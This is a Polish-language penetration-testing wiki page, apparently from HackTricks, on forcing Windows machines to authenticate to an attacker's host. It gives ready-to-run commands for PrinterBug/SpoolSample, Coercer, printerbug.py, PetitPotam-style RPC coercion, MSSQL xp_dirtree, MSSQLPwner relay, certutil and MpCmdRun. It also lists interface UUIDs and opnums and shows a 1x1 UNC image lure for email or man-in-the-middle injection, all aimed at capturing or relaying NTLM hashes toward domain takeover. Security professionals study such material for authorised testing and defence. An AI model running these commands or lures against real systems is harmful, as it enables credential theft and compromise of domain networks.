# Wymuszanie uprzywilejowanego uwierzytelniania NTLM

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) to **zestaw** **remote authentication triggers** napisanych w języku C# przy użyciu kompilatora MIDL, aby uniknąć zależności od firm trzecich.

## Nadużycie usługi Spooler

Jeśli usługa _**Print Spooler**_ jest **włączona,** możesz użyć znanych już poświadczeń AD, aby **zażądać** od serwera wydruku Kontrolera domeny **aktualizacji** dotyczącej nowych zadań drukowania, a następnie nakazać mu **wysłanie powiadomienia do określonego systemu**.\
Należy zauważyć, że gdy drukarka wysyła powiadomienie do dowolnego systemu, musi **uwierzytelnić się względem** tego **systemu**. W związku z tym attacker może spowodować, że usługa _**Print Spooler**_ uwierzytelni się względem dowolnego systemu, a usługa użyje w tym uwierzytelnianiu **konta komputera**.

Pod maską klasyczny primitive **PrinterBug** nadużywa funkcji **`RpcRemoteFindFirstPrinterChangeNotificationEx`** przez **`\\PIPE\\spoolss`**. Najpierw attacker otwiera uchwyt drukarki/serwera, a następnie przekazuje fałszywą nazwę klienta w `pszLocalMachine`, przez co docelowy spooler tworzy kanał powiadomień **z powrotem do hosta kontrolowanego przez attackera**. Dlatego skutkiem jest **wymuszenie uwierzytelniania wychodzącego**, a nie bezpośrednie wykonanie kodu.<sup>[[2]](#references)</sup>\
Jeśli szukasz **RCE/LPE** w samym spoolerze, sprawdź [PrintNightmare](printnightmare.md). Ta strona koncentruje się na **coercion i relay**.

### Znajdowanie serwerów Windows w domenie

Używając PowerShell, pobierz listę systemów Windows. Serwery są zazwyczaj priorytetem, więc skupmy się na nich:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Wyszukiwanie nasłuchujących usług Spooler

Korzystając z nieznacznie zmodyfikowanego narzędzia [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) autorstwa @mysmartlogin (Vincent Le Toux), sprawdź, czy usługa Spooler nasłuchuje:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Możesz również użyć `rpcdump.py` w systemie Linux i poszukać protokołu **MS-RPRN**:
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
Lub szybko przetestuj hosty z systemu Linux za pomocą **NetExec/CrackMapExec**:
```bash
nxc smb targets.txt -u user -p password -M spooler
```
Jeśli chcesz **wyliczyć powierzchnie coercion** zamiast tylko sprawdzić, czy endpoint spoolera istnieje, użyj **trybu skanowania Coercer**:<sup>[[5]](#references)</sup>
```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```
Jest to przydatne, ponieważ obecność endpointu w EPM informuje jedynie, że interfejs print RPC jest zarejestrowany. **Nie** gwarantuje to, że każda metoda coercion będzie osiągalna przy użyciu bieżących uprawnień ani że host wygeneruje użyteczny przepływ uwierzytelniania.

### Poproś usługę o uwierzytelnienie względem dowolnego hosta

Możesz skompilować [SpoolSample stąd](https://github.com/NotMedic/NetNTLMtoSilverTicket).
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
lub użyj [**dementor.py autorstwa 3xocyte**](https://github.com/NotMedic/NetNTLMtoSilverTicket) lub [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py), jeśli korzystasz z systemu Linux
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
Za pomocą **Coercer** możesz bezpośrednio atakować interfejsy spoolera i uniknąć zgadywania, która metoda RPC jest udostępniona:<sup>[[5]](#references)</sup>
```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```
### Wymuszanie HTTP zamiast SMB za pomocą WebClient

Classic PrinterBug zwykle powoduje uwierzytelnienie **SMB** do `\\attacker\share`, co nadal jest przydatne do **capture**, **relay do celów HTTP** lub **relay, gdy nie ma SMB signing**.\
Jednak w nowoczesnych środowiskach **relay z SMB do SMB** jest często blokowany przez **SMB signing**, dlatego operatorzy często wolą wymusić uwierzytelnianie **HTTP/WebDAV**.

Jeśli na celu działa usługa **WebClient**, listener można określić w formie, która sprawi, że Windows użyje **WebDAV przez HTTP**:
```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```
Jest to szczególnie przydatne podczas łączenia z **`ntlmrelayx --adcs`** lub innymi celami HTTP relay, ponieważ eliminuje zależność od możliwości wykonania SMB relay na wymuszonym połączeniu. Ważne zastrzeżenie: **WebClient musi działać** na zaatakowanym komputerze, aby wariant HTTP/WebDAV działał.

### Łączenie z Unconstrained Delegation

Jeśli attacker wcześniej przejął komputer z [Unconstrained Delegation](unconstrained-delegation.md), może **wymusić uwierzytelnienie drukarki na tym komputerze**. Z powodu unconstrained delegation **TGT** **konta komputera drukarki** zostanie **zapisany w** **pamięci** komputera z unconstrained delegation. Ponieważ attacker przejął już ten host, będzie mógł **pobrać ten ticket** i go wykorzystać ([Pass the Ticket](pass-the-ticket.md)).

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)<sup>[[5]](#references)</sup>

### Macierz wymuszania uwierzytelnienia przez RPC UNC-path (interfejsy/opnumy wyzwalające uwierzytelnianie wychodzące)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnumy: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / SpoolSample / Coercer<sup>[[1]](#references)[[6]](#references)</sup>
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Uwagi: asynchroniczny interfejs drukowania w tym samym spooler pipe; użyj Coercer do wyliczenia dostępnych metod na danym hoście<sup>[[1]](#references)[[6]](#references)</sup>
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (również przez \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Powszechnie nadużywane opnumy: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnumy: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce<sup>[[1]](#references)[[6]](#references)[[8]](#references)</sup>
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnumy: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce<sup>[[1]](#references)[[6]](#references)[[9]](#references)</sup>
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce<sup>[[1]](#references)</sup>

Uwaga: Metody te przyjmują parametry, które mogą zawierać UNC path (np. `\\attacker\share`). Podczas przetwarzania Windows uwierzytelni się (w kontekście komputera/użytkownika) do tego UNC, umożliwiając przechwycenie lub relay NetNTLM.\
W przypadku nadużycia spoolera **MS-RPRN opnum 65** nadal pozostaje najczęściej używanym i najlepiej udokumentowanym primitive, ponieważ specyfikacja protokołu wyraźnie stwierdza, że serwer tworzy kanał powiadomień z powrotem do klienta określonego przez `pszLocalMachine`.<sup>[[2]](#references)</sup>

### MS-EVEN: wymuszanie ElfrOpenBELW (opnum 9)
- Interface: MS-EVEN over \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)<sup>[[3]](#references)</sup>
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
- Effect: target próbuje otworzyć podaną ścieżkę backup logu i uwierzytelnia się do kontrolowanego przez attackera UNC.<sup>[[1]](#references)</sup>
- Practical use: wymuszanie na zasobach Tier 0 (DC/RODC/Citrix/etc.) wysyłania NetNTLM, a następnie wykonanie relay do endpointów AD CS (scenariusze ESC8/ESC11) lub innych uprzywilejowanych usług.<sup>[[1]](#references)</sup>

## PrivExchange

Attack `PrivExchange` jest wynikiem błędu znalezionego w **funkcji `PushSubscription` serwera Exchange**. Funkcja ta umożliwia wymuszenie przez serwer Exchange, aby dowolny użytkownik domeny posiadający mailbox uwierzytelnił się do dowolnego hosta podanego przez klienta za pośrednictwem HTTP.

Domyślnie **usługa Exchange działa jako SYSTEM** i ma nadmierne uprawnienia (w szczególności posiada **uprawnienia WriteDacl w domenie przed wydaniem Cumulative Update 2019**). Ten błąd można wykorzystać do włączenia **relay informacji do LDAP, a następnie wyodrębnienia bazy danych NTDS domeny**. Jeśli relay do LDAP nie jest możliwy, błąd nadal można wykorzystać do wykonania relay i uwierzytelnienia do innych hostów w domenie. Skuteczne wykorzystanie tego attacku zapewnia natychmiastowy dostęp do Domain Admin przy użyciu dowolnego uwierzytelnionego konta użytkownika domeny.

## Wewnątrz Windows

Jeśli jesteś już wewnątrz maszyny Windows, możesz wymusić połączenie Windows z serwerem przy użyciu uprzywilejowanych kont za pomocą:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Lub użyj tej innej techniki: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Możliwe jest użycie certutil.exe lolbin (binarnego pliku podpisanego przez Microsoft) do wymuszenia uwierzytelniania NTLM:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### Przez email

Jeśli znasz **email address** użytkownika, który loguje się do maszyny, którą chcesz przejąć, możesz po prostu wysłać mu **email z obrazem 1x1** takim jak
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
a gdy ją otworzy, spróbuje się uwierzytelnić.

### MitM

Jeśli możesz przeprowadzić atak MitM na komputer i wstrzyknąć kod HTML do strony, którą użytkownik wyświetli, możesz spróbować wstrzyknąć do niej obraz taki jak poniżej:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Inne sposoby wymuszania i wyłudzania uwierzytelniania NTLM


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Łamanie NTLMv1

Jeśli możesz przechwytywać [wyzwania NTLMv1, tutaj przeczytasz, jak je łamać](../ntlm/index.html#ntlmv1-attack).\
_Pamiętaj, że aby złamać NTLMv1, musisz ustawić wyzwanie Responder na „1122334455667788”_

## Odnośniki

- [1] [Unit 42 – Wymuszanie uwierzytelniania wciąż ewoluuje](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [2] [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [3] [Microsoft – MS-EVEN: Protokół zdalnego dostępu do dziennika zdarzeń](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [4] [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [6] [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)

{{#include ../../banners/hacktricks-training.md}}
